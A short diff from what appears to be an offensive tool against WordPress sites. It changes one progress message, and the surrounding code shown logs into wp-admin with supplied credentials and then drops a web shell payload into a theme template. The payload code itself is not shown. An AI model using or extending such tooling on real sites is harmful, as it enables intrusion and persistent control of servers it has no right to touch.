@@ -45,7 +45,7 @@ def omega(args: Namespace):
         wp_admin_session = login_service.get_wp_admin_session(username, password)
         p.success('Got admin session!')
 
-    with log.progress('Dropping payload in the current 404 template...') as p:
+    with log.progress('Dropping payload in the current footer template...') as p:
         payload_service = PayloadService(wp_url, wp_admin_session)
         web_shell_url = payload_service.drop_payload()
         p.success('Payload ready')
